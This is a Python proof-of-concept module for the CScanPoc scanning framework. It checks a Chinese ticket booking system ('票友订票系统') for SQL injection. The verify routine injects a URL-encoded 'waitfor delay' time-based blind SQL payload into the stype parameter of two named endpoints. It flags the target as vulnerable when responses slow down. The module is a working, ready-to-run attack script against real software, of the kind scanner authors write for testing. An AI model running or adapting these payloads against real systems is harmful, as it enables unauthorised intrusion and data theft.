# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import urllib

class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0003' # 平台漏洞编号，留空
    name = '票友订票系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-17'  # 漏洞公布时间
    desc = '''
        票友订票系统存在多处SQL注入漏洞：
        /Json_db/other_report.aspx
        /Json_db/flight_search.aspx
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '票友'  # 漏洞应用名称
    product_version = '票友订票系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2cd40748-366e-47b0-a6c8-1eb3f95a5494'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0101951
            time_blind = "%27;%20waitfor%20delay%20%270:0:5%27%20--%20"
            payloads = [
                "/Json_db/other_report.aspx?its=1&stype=%s&dfs=0&sdate=2015-3-17&edate=2015-3-17&fs=&keyword=1&col=id,subject,name,kefu,sales,hc,hb,qforder,total,ysmoney,stype,sdate,content&_search=false&nd=1426583717093&rows=25&page=1&sidx=id&sord=desc",
                "/Json_db/flight_search.aspx?stype=%s&ptype=&ddw=1&sdate=2015-3-17&edate=2015-3-17&fs=&keyword=&_search=false&nd=1426585534292&rows=18&page=1&sidx=id&sord=desc"
            ]
            for payload in payloads:
                target = self.target + payload % ''
                target2 = self.target + payload % time_blind
                s = time.time()
                code, head, body, errcode, final_url = hh.http(target)
                t1 = time.time() - s
                s = time.time()
                code, head, body, errcode, final_url = hh.http(target2)
                t2 = time.time() - s
                if t2 - t1 > 4:
                    #security_hole(target2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
